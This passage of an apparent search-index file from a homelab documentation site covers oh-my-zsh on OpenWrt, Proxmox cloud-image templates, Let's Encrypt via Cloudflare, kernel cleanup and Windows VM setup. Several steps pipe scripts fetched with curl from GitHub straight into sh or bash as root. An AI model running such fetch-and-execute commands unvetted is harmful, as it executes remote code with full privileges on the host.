scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features. What's Oh-My-Zsh \u00b6 Oh My Zsh is an open source, community-driven framework for managing your zsh configuration. Installation of oh-my-zsh \u00b6 Install Requirements Packages opkg update && opkg install ca-certificates zsh curl git-http Install oh-my-zsh sh -c \" $( curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh ) \" Set zsh as default (thanks to @mlouielu ) which zsh && sed -i -- 's:/bin/ash:' ` which zsh ` ':g' /etc/passwd Prevent User Lockout \u00b6 To prevent lock-outs after accidentially removing zsh (thanks to @fox34 ) ([as explained in the wiki][openwrt-wiki-url]{target=_blank} you can add a check for zsh and fallback to ash in /etc/rc.local : # Revert root shell to ash if zsh is not available if grep -q '^root:.*:/usr/bin/zsh$' /etc/passwd && [ ! -x /usr/bin/zsh ] ; then # zsh is root shell, but zsh was not found or not executable: revert to default ash [ -x /usr/bin/logger ] && /usr/bin/logger -s \"Reverting root shell to ash, as zsh was not found on the system\" sed -i -- 's:/usr/bin/zsh:/bin/ash:g' /etc/passwd fi", "title": "oh-my-zsh Install"}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#install-oh-my-zsh-on-openwrt", "text": "You can install oh-my-zsh on OpenWrt, make sure to use the Prevent User Lockout option since many users been locked out of their sessions since the zsh shell was not installed or loaded properly.", "title": "Install oh-my-zsh on OpenWrt"}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#whats-zsh", "text": "Z-shell (Zsh) configuration. is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features.", "title": "Whats' ZSH"}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#whats-oh-my-zsh", "text": "Oh My Zsh is an open source, community-driven framework for managing your zsh configuration.", "title": "What's Oh-My-Zsh"}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#installation-of-oh-my-zsh", "text": "Install Requirements Packages opkg update && opkg install ca-certificates zsh curl git-http Install oh-my-zsh sh -c \" $( curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh ) \" Set zsh as default (thanks to @mlouielu ) which zsh && sed -i -- 's:/bin/ash:' ` which zsh ` ':g' /etc/passwd", "title": "Installation of oh-my-zsh"}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#prevent-user-lockout", "text": "To prevent lock-outs after accidentially removing zsh (thanks to @fox34 ) ([as explained in the wiki][openwrt-wiki-url]{target=_blank} you can add a check for zsh and fallback to ash in /etc/rc.local : # Revert root shell to ash if zsh is not available if grep -q '^root:.*:/usr/bin/zsh$' /etc/passwd && [ ! -x /usr/bin/zsh ] ; then # zsh is root shell, but zsh was not found or not executable: revert to default ash [ -x /usr/bin/logger ] && /usr/bin/logger -s \"Reverting root shell to ash, as zsh was not found on the system\" sed -i -- 's:/usr/bin/zsh:/bin/ash:g' /etc/passwd fi", "title": "Prevent User Lockout"}, {"location": "infrastructure/proxmox/cloud-image-template/", "tags": ["proxmox", "virtualization"], "text": "Proxmox Cloud Image Template \u00b6 About Cloud Images \u00b6 Cloud images are operating system templates and every instance starts out as an identical clone of every other instance. It is the user data that gives every cloud instance its personality and cloud-init is the tool that applies user data to your instances automatically. Advantage of Cloud Image Template \u00b6 Predefined SSH keys Predefined user account Predefined network configuration VM creation time is under few minutes No installation process required like with ISO images First boot always updated with latest updates Ubuntu Cloud Images \u00b6 Ubuntu provides official cloud images you can find the proper image for your needs at cloud-images.ubuntu.com . In this tutorial we will be using Ubuntu Server 22.04 LTS Jammy Jellyfish cloud image. Create Cloud Image Template \u00b6 SSH to you Proxmox server. Download the cloud image template from the official website. wget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img In order to create a cloud image template first of all we need to create a new VM . After we will configure it we will create a Template from it. The following parameters will predefine our Base Template Command parameters description: 9000 : VM ID in Proxmox. I prefer to use high number for management purposes. memory : VM's memory in MB. core : Number of CPU cores for the VM. name : Name of the VM and the template. net0 : Network interface for the VM. bridge : Network bridge for the VM. agent : Enable or disable QEMU agent support. onboot : Enable or disable VM start on boot. Create a new virtual machine. qm create 9000 --memory 2048 --core 2 --name ubuntu-22.04-cloud --net0 virtio,bridge = vmbr0 --agent enabled = 1 --onboot 1 The default storage Proxmox creates for vm is storage1 . In my case I use different storage for vm's and templates named storage1 . The following commands will utilize the storage1 storage. Change the storage name for your Proxmox server. Import the downloaded Ubuntu Cloud Image we downloaded before disk to the storage. qm importdisk 9000 jammy-server-cloudimg-amd64.img storage1 Attach the new disk to the vm as a scsi drive on the scsi controller qm set 9000 --scsihw virtio-scsi-pci --scsi0 storage1:vm-9000-disk-0 Add cloud init drive qm set 9000 --ide2 storage1:cloudinit Make the cloud init drive bootable and restrict BIOS to boot from disk only qm set 9000 --boot c --bootdisk scsi0 Add serial console qm set 9000 --serial0 socket --vga serial0 WARNING: DO NOT START THE VM Powering on the vm will create a unique ID that will presist with the template. We want to avoid this. Now had to the Proxmox web interface. Select the new vm and Cloud-Init tab. Configure the default setting for the cloud image template. This will allow the VM to start with predefined user, password, ssh keys and network configuration. At this point we configured the VM and we can create a cloud image template from it. Create a new cloud image template. qm template 9000 Now you can use the Cloud Image Template to create new vm instances. You can do it from the Proxmox web interface or from the command line. Tip Use Full Clone when creating a new VM from a cloud image template. Linked Clone will privent you from deleting the cloud image template. Cli example: qm clone 9000 122 --name my-new-vm --full VM's Storage \u00b6 Since we are using a minimal cloud image template. Cloned VM's will use the same storage as the template which is about 2GB of disk space. You can utilize an automated script to to expand the disk space of the cloned VM: VM Disk Expander Troubleshooting \u00b6 Reseting VM's machine-id \u00b6 Run the following command inside the VM to reset the machine-id. sudo rm -f /etc/machine-id sudo rm -f /var/lib/dbus/machine-id Shutdown the VM. Then power it back on. The machine-id will be regenerated. If the machine-id is not regenerated you can try to fix it by running the following command. sudo systemd-machine-id-setup", "title": "Cloud Image Template"}, {"location": "infrastructure/proxmox/cloud-image-template/#proxmox-cloud-image-template", "text": "", "title": "Proxmox Cloud Image Template"}, {"location": "infrastructure/proxmox/cloud-image-template/#about-cloud-images", "text": "Cloud images are operating system templates and every instance starts out as an identical clone of every other instance. It is the user data that gives every cloud instance its personality and cloud-init is the tool that applies user data to your instances automatically.", "title": "About Cloud Images"}, {"location": "infrastructure/proxmox/cloud-image-template/#advantage-of-cloud-image-template", "text": "Predefined SSH keys Predefined user account Predefined network configuration VM creation time is under few minutes No installation process required like with ISO images First boot always updated with latest updates", "title": "Advantage of Cloud Image Template"}, {"location": "infrastructure/proxmox/cloud-image-template/#ubuntu-cloud-images", "text": "Ubuntu provides official cloud images you can find the proper image for your needs at cloud-images.ubuntu.com . In this tutorial we will be using Ubuntu Server 22.04 LTS Jammy Jellyfish cloud image.", "title": "Ubuntu Cloud Images"}, {"location": "infrastructure/proxmox/cloud-image-template/#create-cloud-image-template", "text": "SSH to you Proxmox server. Download the cloud image template from the official website. wget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img In order to create a cloud image template first of all we need to create a new VM . After we will configure it we will create a Template from it. The following parameters will predefine our Base Template Command parameters description: 9000 : VM ID in Proxmox. I prefer to use high number for management purposes. memory : VM's memory in MB. core : Number of CPU cores for the VM. name : Name of the VM and the template. net0 : Network interface for the VM. bridge : Network bridge for the VM. agent : Enable or disable QEMU agent support. onboot : Enable or disable VM start on boot. Create a new virtual machine. qm create 9000 --memory 2048 --core 2 --name ubuntu-22.04-cloud --net0 virtio,bridge = vmbr0 --agent enabled = 1 --onboot 1 The default storage Proxmox creates for vm is storage1 . In my case I use different storage for vm's and templates named storage1 . The following commands will utilize the storage1 storage. Change the storage name for your Proxmox server. Import the downloaded Ubuntu Cloud Image we downloaded before disk to the storage. qm importdisk 9000 jammy-server-cloudimg-amd64.img storage1 Attach the new disk to the vm as a scsi drive on the scsi controller qm set 9000 --scsihw virtio-scsi-pci --scsi0 storage1:vm-9000-disk-0 Add cloud init drive qm set 9000 --ide2 storage1:cloudinit Make the cloud init drive bootable and restrict BIOS to boot from disk only qm set 9000 --boot c --bootdisk scsi0 Add serial console qm set 9000 --serial0 socket --vga serial0 WARNING: DO NOT START THE VM Powering on the vm will create a unique ID that will presist with the template. We want to avoid this. Now had to the Proxmox web interface. Select the new vm and Cloud-Init tab. Configure the default setting for the cloud image template. This will allow the VM to start with predefined user, password, ssh keys and network configuration. At this point we configured the VM and we can create a cloud image template from it. Create a new cloud image template. qm template 9000 Now you can use the Cloud Image Template to create new vm instances. You can do it from the Proxmox web interface or from the command line. Tip Use Full Clone when creating a new VM from a cloud image template. Linked Clone will privent you from deleting the cloud image template. Cli example: qm clone 9000 122 --name my-new-vm --full", "title": "Create Cloud Image Template"}, {"location": "infrastructure/proxmox/cloud-image-template/#vms-storage", "text": "Since we are using a minimal cloud image template. Cloned VM's will use the same storage as the template which is about 2GB of disk space. You can utilize an automated script to to expand the disk space of the cloned VM: VM Disk Expander", "title": "VM's Storage"}, {"location": "infrastructure/proxmox/cloud-image-template/#troubleshooting", "text": "", "title": "Troubleshooting"}, {"location": "infrastructure/proxmox/cloud-image-template/#reseting-vms-machine-id", "text": "Run the following command inside the VM to reset the machine-id. sudo rm -f /etc/machine-id sudo rm -f /var/lib/dbus/machine-id Shutdown the VM. Then power it back on. The machine-id will be regenerated. If the machine-id is not regenerated you can try to fix it by running the following command. sudo systemd-machine-id-setup", "title": "Reseting VM's machine-id"}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/", "tags": ["proxmox", "cloudflare", "letsencrypt"], "text": "Proxmox Valid SSL With Let's Encrypt and Cloudflare DNS \u00b6 This is a guide to how to setup a valid SSL certificate with Let's Encrypt and Cloudflare DNS for Proxmox VE . Let's Encrypt will allow you to obtain a valid SSL certificate for your Proxmox VE Server for free for 90 days. In the following steps, we will setup a valid SSL certificate for your Proxmox VE Server using Let's Encrypt and Cloudflare DNS Challenge. The process of renewing the certificate is done automatically by Proxmox VE Server and you do not need to do anything manually to renew the certificate. Prerequarements \u00b6 Exisiting DNS record for the domain name you want to use for Proxmox VE. Cloudflare DNS Zone API Access Token. Cloudflare DNS Zone ID. I won't be covcovering the process of creating the Zone API Tokens at this guide. You can find more information about this process here . Instalaion and Configuration \u00b6 The process will be done fully in Proxmox web interface. Login to the Proxmox web interface select Datacenter , find ACME and click on it. At Account section, click Add. Fill the Account Name and E-Mail . Accept the Terms and Conditions (TOC). Click Register . This will register an account for Let's Encrypt service in order to obtain a certificate. The output should be something like this: At Challenge Plugin ection, click Add. Fill the Plugin ID (name), at DNS API choose Cloudflare Managed DNS . CF_Token= and CF_Zone_ID= are the API Tokens and Zone ID for Cloudflare DNS - leave the rest empty. The final screen should look like this: Select the Pve Server in my case its name proxmox , under System select Certificates . At ACME section, click Edit and select the Account we created earlier. Click Add , select Challenge Type DNS and Challenge Plugin the plugin we created earlier. Domain is the domain name we want to use for the certificate. Click Create . Now its time to issue the certificate. Click Order Certificate Now . At this point Proxmox will try to issue the certificate from Let's Encrypt and validate it with Cloudflare DNS Challenge. If all goes well, you will see the following: Now the certificate is installed and ready to use. The renewal process is done automatically by Proxmox VE Server.", "title": "Let's Encrypt with Cloudflare"}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/#proxmox-valid-ssl-with-lets-encrypt-and-cloudflare-dns", "text": "This is a guide to how to setup a valid SSL certificate with Let's Encrypt and Cloudflare DNS for Proxmox VE . Let's Encrypt will allow you to obtain a valid SSL certificate for your Proxmox VE Server for free for 90 days. In the following steps, we will setup a valid SSL certificate for your Proxmox VE Server using Let's Encrypt and Cloudflare DNS Challenge. The process of renewing the certificate is done automatically by Proxmox VE Server and you do not need to do anything manually to renew the certificate.", "title": "Proxmox Valid SSL With Let's Encrypt and Cloudflare DNS"}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/#prerequarements", "text": "Exisiting DNS record for the domain name you want to use for Proxmox VE. Cloudflare DNS Zone API Access Token. Cloudflare DNS Zone ID. I won't be covcovering the process of creating the Zone API Tokens at this guide. You can find more information about this process here .", "title": "Prerequarements"}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/#instalaion-and-configuration", "text": "The process will be done fully in Proxmox web interface. Login to the Proxmox web interface select Datacenter , find ACME and click on it. At Account section, click Add. Fill the Account Name and E-Mail . Accept the Terms and Conditions (TOC). Click Register . This will register an account for Let's Encrypt service in order to obtain a certificate. The output should be something like this: At Challenge Plugin ection, click Add. Fill the Plugin ID (name), at DNS API choose Cloudflare Managed DNS . CF_Token= and CF_Zone_ID= are the API Tokens and Zone ID for Cloudflare DNS - leave the rest empty. The final screen should look like this: Select the Pve Server in my case its name proxmox , under System select Certificates . At ACME section, click Edit and select the Account we created earlier. Click Add , select Challenge Type DNS and Challenge Plugin the plugin we created earlier. Domain is the domain name we want to use for the certificate. Click Create . Now its time to issue the certificate. Click Order Certificate Now . At this point Proxmox will try to issue the certificate from Let's Encrypt and validate it with Cloudflare DNS Challenge. If all goes well, you will see the following: Now the certificate is installed and ready to use. The renewal process is done automatically by Proxmox VE Server.", "title": "Instalaion and Configuration"}, {"location": "infrastructure/proxmox/pvekclean/", "tags": ["proxmox"], "text": "PVE Kernel Cleaner \u00b6 Easily remove old/unused PVE kernels on your Proxmox VE system Developers \u00b6 Jordan Hillis - Lead Developer The original pvekclean github page What is PVE Kernel Cleaner? \u00b6 PVE Kernel Cleaner is a program to compliment Proxmox Virtual Environment which is an open-source server virtualization environment. PVE Kernel Cleaner allows you to purge old/unused kernels filling the /boot directory. As new kernels are released the older ones have to be manually removed frequently to make room for newer ones. This can become quite tedious and require extensive time spent monitoring the system when new kernels are released and when older ones need to be cleared out to make room. With this issue existing, PVE Kernel Cleaner was created to solve it. Features \u00b6 Removes old PVE kernels from your system Ability to schedule PVE kernels to automatically be removed on a daily/weekly/monthly basis Run a simple pvekclean command for ease of access Checks health of boot disk based on space available Support for the latest Proxmox versions and PVE kernels Prerequisites \u00b6 Before using this program you will need to have the following packages installed. * cron To install all required packages enter the following command. Debian: \u00b6 sudo apt-get install cron Installing \u00b6 To install PVE Kernel Cleaner please enter the following commands git clone https://github.com/jordanhillis/pvekclean.git cd pvekclean chmod +x pvekclean.sh ./pvekclean.sh Updating \u00b6 To update PVE Kernel Cleaner please run the same commands as described in the \"Installing\" section. Usage \u00b6 Example of usage: pvekclean [OPTION] -f --force Remove all old PVE kernels without confirm prompts -s --scheduler Have old PVE kernels removed on a scheduled basis -v --version Shows the current version of pvekclean -r --remove Uninstalls pvekclean from the system -h --help Show these options", "title": "PVE Kernel Cleaner"}, {"location": "infrastructure/proxmox/pvekclean/#pve-kernel-cleaner", "text": "Easily remove old/unused PVE kernels on your Proxmox VE system", "title": "PVE Kernel Cleaner"}, {"location": "infrastructure/proxmox/pvekclean/#developers", "text": "Jordan Hillis - Lead Developer The original pvekclean github page", "title": "Developers"}, {"location": "infrastructure/proxmox/pvekclean/#what-is-pve-kernel-cleaner", "text": "PVE Kernel Cleaner is a program to compliment Proxmox Virtual Environment which is an open-source server virtualization environment. PVE Kernel Cleaner allows you to purge old/unused kernels filling the /boot directory. As new kernels are released the older ones have to be manually removed frequently to make room for newer ones. This can become quite tedious and require extensive time spent monitoring the system when new kernels are released and when older ones need to be cleared out to make room. With this issue existing, PVE Kernel Cleaner was created to solve it.", "title": "What is PVE Kernel Cleaner?"}, {"location": "infrastructure/proxmox/pvekclean/#features", "text": "Removes old PVE kernels from your system Ability to schedule PVE kernels to automatically be removed on a daily/weekly/monthly basis Run a simple pvekclean command for ease of access Checks health of boot disk based on space available Support for the latest Proxmox versions and PVE kernels", "title": "Features"}, {"location": "infrastructure/proxmox/pvekclean/#prerequisites", "text": "Before using this program you will need to have the following packages installed. * cron To install all required packages enter the following command.", "title": "Prerequisites"}, {"location": "infrastructure/proxmox/pvekclean/#installing", "text": "To install PVE Kernel Cleaner please enter the following commands git clone https://github.com/jordanhillis/pvekclean.git cd pvekclean chmod +x pvekclean.sh ./pvekclean.sh", "title": "Installing"}, {"location": "infrastructure/proxmox/pvekclean/#updating", "text": "To update PVE Kernel Cleaner please run the same commands as described in the \"Installing\" section.", "title": "Updating"}, {"location": "infrastructure/proxmox/pvekclean/#usage", "text": "Example of usage: pvekclean [OPTION] -f --force Remove all old PVE kernels without confirm prompts -s --scheduler Have old PVE kernels removed on a scheduled basis -v --version Shows the current version of pvekclean -r --remove Uninstalls pvekclean from the system -h --help Show these options", "title": "Usage"}, {"location": "infrastructure/proxmox/vm-disk-expander/", "tags": ["proxmox", "virtualization"], "text": "Proxmox Virtual Machine Disk Expander \u00b6 Github Repository: Proxmox vm disk expander Interactive disk expander for Proxmox's VM disks (including the partition) from your Proxmox host cli. Curl Method \u00b6 Run the script once, without installing it. bash < ( curl -s https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/expand.sh ) Installer \u00b6 Install the script at Proxmox host for multiple use. Run the following command from Proxmox host: curl -sS https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/install.sh | bash Usage \u00b6 expand-disk Update \u00b6 Same as the installer. curl -sS https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/install.sh | bash Example usage/output \u00b6 \u256d\u2500root@proxmox ~ \u2570\u2500# bash < ( curl -s https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/expand.sh ) 1 \u21b5 VMID NAME STATUS MEM ( MB ) BOOTDISK ( GB ) PID 100 vm100 running 4096 40 .20 1113 101 test stopped 2048 2 .20 0 9000 ubuntu22-04-cloud stopped 2048 2 .20 0 Enter the VM ID to be expanded: 101 Enter the size to be expanded in GB ( example: 10G ) : 5G VM ID 101 disk storage1 will be expanded by 5G Warning: There is currently no way to downsize the disk! Are you sure you want to expand the disk? ( yes/no ) : yes Expanding the disk... Size of logical volume storage1/vm-101-disk-0 changed from < 2 .20 GiB ( 563 extents ) to < 7 .20 GiB ( 1843 extents ) . Logical volume storage1/vm-101-disk-0 successfully resized. GPT:Primary header thinks Alt. header is not at the end of the disk. GPT:Alternate GPT header not at the end of the disk. GPT: Use GNU Parted to correct GPT errors. add map storage1-vm--101--disk--0p1 ( 253 :12 ) : 0 4384735 linear 253 :11 227328 add map storage1-vm--101--disk--0p14 ( 253 :13 ) : 0 8192 linear 253 :11 2048 add map storage1-vm--101--disk--0p15 ( 253 :14 ) : 0 217088 linear 253 :11 10240 Warning: The kernel is still using the old partition table. The new table will be used at the next reboot or after you run partprobe ( 8 ) or kpartx ( 8 ) The operation has completed successfully. Limitations \u00b6 VM must be stopped to expand the disk. Currently supported only \"cloud images\" (or single ext4 partition installation) but if you still want to resize regular vm with LVM partition table, you need to extend the LVM partition INSIDE the vm AFTER running the script. Resizing LVM is done like this: $ lvm lvm> lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv lvm> exit $ resize2fs /dev/ubuntu-vg/ubuntu-lv Resize of Ceph disks is currently not supported (PR are welcome!)", "title": "VM Disk Expander"}, {"location": "infrastructure/proxmox/vm-disk-expander/#proxmox-virtual-machine-disk-expander", "text": "Github Repository: Proxmox vm disk expander Interactive disk expander for Proxmox's VM disks (including the partition) from your Proxmox host cli.", "title": "Proxmox Virtual Machine Disk Expander"}, {"location": "infrastructure/proxmox/vm-disk-expander/#curl-method", "text": "Run the script once, without installing it. bash < ( curl -s https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/expand.sh )", "title": "Curl Method"}, {"location": "infrastructure/proxmox/vm-disk-expander/#installer", "text": "Install the script at Proxmox host for multiple use. Run the following command from Proxmox host: curl -sS https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/install.sh | bash", "title": "Installer"}, {"location": "infrastructure/proxmox/vm-disk-expander/#usage", "text": "expand-disk", "title": "Usage"}, {"location": "infrastructure/proxmox/vm-disk-expander/#update", "text": "Same as the installer. curl -sS https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/install.sh | bash", "title": "Update"}, {"location": "infrastructure/proxmox/vm-disk-expander/#example-usageoutput", "text": "\u256d\u2500root@proxmox ~ \u2570\u2500# bash < ( curl -s https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/expand.sh ) 1 \u21b5 VMID NAME STATUS MEM ( MB ) BOOTDISK ( GB ) PID 100 vm100 running 4096 40 .20 1113 101 test stopped 2048 2 .20 0 9000 ubuntu22-04-cloud stopped 2048 2 .20 0 Enter the VM ID to be expanded: 101 Enter the size to be expanded in GB ( example: 10G ) : 5G VM ID 101 disk storage1 will be expanded by 5G Warning: There is currently no way to downsize the disk! Are you sure you want to expand the disk? ( yes/no ) : yes Expanding the disk... Size of logical volume storage1/vm-101-disk-0 changed from < 2 .20 GiB ( 563 extents ) to < 7 .20 GiB ( 1843 extents ) . Logical volume storage1/vm-101-disk-0 successfully resized. GPT:Primary header thinks Alt. header is not at the end of the disk. GPT:Alternate GPT header not at the end of the disk. GPT: Use GNU Parted to correct GPT errors. add map storage1-vm--101--disk--0p1 ( 253 :12 ) : 0 4384735 linear 253 :11 227328 add map storage1-vm--101--disk--0p14 ( 253 :13 ) : 0 8192 linear 253 :11 2048 add map storage1-vm--101--disk--0p15 ( 253 :14 ) : 0 217088 linear 253 :11 10240 Warning: The kernel is still using the old partition table. The new table will be used at the next reboot or after you run partprobe ( 8 ) or kpartx ( 8 ) The operation has completed successfully.", "title": "Example usage/output"}, {"location": "infrastructure/proxmox/vm-disk-expander/#limitations", "text": "VM must be stopped to expand the disk. Currently supported only \"cloud images\" (or single ext4 partition installation) but if you still want to resize regular vm with LVM partition table, you need to extend the LVM partition INSIDE the vm AFTER running the script. Resizing LVM is done like this: $ lvm lvm> lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv lvm> exit $ resize2fs /dev/ubuntu-vg/ubuntu-lv Resize of Ceph disks is currently not supported (PR are welcome!)", "title": "Limitations"}, {"location": "infrastructure/proxmox/windows-vm-configuration/", "tags": ["Proxmox", "Windows Virtual Machines", "VirtIO"], "text": "Proxmox Windows Virtual Machine Configuration \u00b6 This guide will walk you through configuring Windows 10 or Windows 11 Virtual Machines with VirtIO Disks and Networking using Proxmox. This configuration was tested to work with the GPU passthroughs feature from one of the following guides: GPU Passthrough to VM - Full GPU passthrough to VM guide iGPU Passthrough to VM - Cpu's GPU passthrough to VM guide (Intel) iGPU Split Passthrough - Splitting (CPU's GPU) to Multiple GPUs passthrough to VM guide Prerequirements \u00b6 Before we begin, we need to download the VirtIO Drivers for Windwos iso . Upload it via the GUI as any other ISO file. You can allso use ssh and download it directly from the Proxmox server. wget -P /var/lib/vz/template/iso https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso Create a VM in Proxmox \u00b6 Create a Virutal Machine in Proxmox as usual. General \u00b6 Select Advanced options. OS \u00b6 Choose the iso file image for Windows 10 or 11. Change Type to Microsoft Windows and Version to your's windwos version. System \u00b6 Change the Machine type to q35 , BIOS to UEFI . Add TPM for Windows 11. Alocate Storage for UEFI BIOS and TPM. Disks \u00b6 Set Bus/Device to VirtIO Block and Cache to Write Through . Select the storage disk and the VM's disk size. CPU \u00b6 Choose how many cores you want to use. Set The cpu Type to Host Memory \u00b6 Alocate the memory for the VM. Make sure the Ballooning Device is enabled. Network \u00b6 Select your preferred network interface. Set the Model to VirtIO (paravirtualized) . Confirm \u00b6 Don't Start the VM after creating it. Add CD/DVD to VM \u00b6 We will need to use the VirtIO Drivers for Windows iso file to install the drivers while installing the Windwos VM. Hardware Before Installation \u00b6 This how the hardware of the VM should look like befor starting the Windows installation. Windows Installation \u00b6 The Windows installation process is the same as any other Windows OS installation. The only caveat is that you need to install the drivers for the Storage devices and Network devices. Choose Custom: Install Windows only (advanced) \u00b6 Missing Storage Devices \u00b6 When prompted to select the storage device to install windows the device won't show since we are using the VirtIO storage. Select Load Driver . Load the VirtIO Drivers \u00b6 Browse to the VirtIO Disk find a folder called viostor and select the appropriate windows driver. You should see the a Red Hat VirtIO driver selected. Click Next and install the driver. Continue with the installation as usual \u00b6 Missing Network Driver \u00b6 Windows won't be able to load network drivers while installing. When prompted with something for connecting to the Internet, select I Don't have internet and skip it. We will deal with the network drivers at post installation. Post Installation \u00b6 Install all the VirtIO Drivers for Windows \u00b6 Open the VirtIO CD and run the virtio-win-gt-x64.exe , virtio-win-guest-tools installer. This will install all the missing virtio drivers for the VM and guest OS tools. After the installtion your Device Manager should look like this without any errors. Remove the VirtIO CD/DVD and Windows iso \u00b6 Power off the VM. Remove the added CD/DVD for VirtIO iso. Select Do nor use any media on the CD/DVD with the Windows iso. At this point we are done with the installation of the Windows VM. Follow those guides for utilizing a GPU passthrough to VM: GPU Passthrough to VM - Full GPU passthrough to VM guide iGPU Passthrough to VM - Cpu's GPU passthrough to VM guide (Intel) [GPU Split Passthrough][gpu-split-passthrough] - Splitting (Nvidia) to Multiple GPUs passthrough to VM guide", "title": "Windows VM Configuration"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#proxmox-windows-virtual-machine-configuration", "text": "This guide will walk you through configuring Windows 10 or Windows 11 Virtual Machines with VirtIO Disks and Networking using Proxmox. This configuration was tested to work with the GPU passthroughs feature from one of the following guides: GPU Passthrough to VM - Full GPU passthrough to VM guide iGPU Passthrough to VM - Cpu's GPU passthrough to VM guide (Intel) iGPU Split Passthrough - Splitting (CPU's GPU) to Multiple GPUs passthrough to VM guide", "title": "Proxmox Windows Virtual Machine Configuration"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#prerequirements", "text": "Before we begin, we need to download the VirtIO Drivers for Windwos iso . Upload it via the GUI as any other ISO file. You can allso use ssh and download it directly from the Proxmox server. wget -P /var/lib/vz/template/iso https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso", "title": "Prerequirements"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#create-a-vm-in-proxmox", "text": "Create a Virutal Machine in Proxmox as usual.", "title": "Create a VM in Proxmox"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#general", "text": "Select Advanced options.", "title": "General"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#os", "text": "Choose the iso file image for Windows 10 or 11. Change Type to Microsoft Windows and Version to your's windwos version.", "title": "OS"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#system", "text": "Change the Machine type to q35 , BIOS to UEFI . Add TPM for Windows 11. Alocate Storage for UEFI BIOS and TPM.", "title": "System"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#disks", "text": "Set Bus/Device to VirtIO Block and Cache to Write Through . Select the storage disk and the VM's disk size.", "title": "Disks"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#cpu", "text": "Choose how many cores you want to use. Set The cpu Type to Host", "title": "CPU"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#memory", "text": "Alocate the memory for the VM. Make sure the Ballooning Device is enabled.", "title": "Memory"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#network", "text": "Select your preferred network interface. Set the Model to VirtIO (paravirtualized) .", "title": "Network"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#confirm", "text": "Don't Start the VM after creating it.", "title": "Confirm"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#add-cddvd-to-vm", "text": "We will need to use the VirtIO Drivers for Windows iso file to install the drivers while installing the Windwos VM.", "title": "Add CD/DVD to VM"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#hardware-before-installation", "text": "This how the hardware of the VM should look like befor starting the Windows installation.", "title": "Hardware Before Installation"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#windows-installation", "text": "The Windows installation process is the same as any other Windows OS installation. The only caveat is that you need to install the drivers for the Storage devices and Network devices.", "title": "Windows Installation"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#choose-custom-install-windows-only-advanced", "text": "", "title": "Choose Custom: Install Windows only (advanced)"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#missing-storage-devices", "text": "When prompted to select the storage device to install windows the device won't show since we are using the VirtIO storage. Select Load Driver .", "title": "Missing Storage Devices"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#load-the-virtio-drivers", "text": "Browse to the VirtIO Disk find a folder called viostor and select the appropriate windows driver. You should see the a Red Hat VirtIO driver selected. Click Next and install the driver.", "title": "Load the VirtIO Drivers"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#continue-with-the-installation-as-usual", "text": "", "title": "Continue with the installation as usual"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#missing-network-driver", "text": "Windows won't be able to load network drivers while installing. When prompted with something for connecting to the Internet, select I Don't have internet and skip it. We will deal with the network drivers at post installation.", "title": "Missing Network Driver"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#post-installation", "text": "", "title": "Post Installation"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#install-all-the-virtio-drivers-for-windows", "text": "Open the VirtIO CD and run the virtio-win-gt-x64.exe , virtio-win-guest-tools installer. This will install all the missing virtio drivers for the VM and guest OS tools. After the installtion your Device Manager should look like this without any errors.", "title": "Install all the VirtIO Drivers for Windows"}, {"location": "infrastructure/proxmox/windows-vm-configuration/#remove-the-virtio-cddvd-and-windows-iso", "text": "Power off the VM. Remove the added CD/DVD for VirtIO iso. Select Do nor use any media on the CD/DVD with the Windows iso. At this point we are done with the installation of the Windows VM. Follow those guides for utilizing a GPU passthrough to VM: GPU Passthrough to VM - Full GPU passthrough to VM guide iGPU Passthrough to VM - Cpu's GPU passthrough to VM guide (Intel) [GPU Split Passthrough][gpu-split-passthrough] - Splitting (Nvidia) to Multiple GPUs passthrough to VM guide", "title": "Remove the VirtIO CD/DVD and Windows iso"}, {"location": 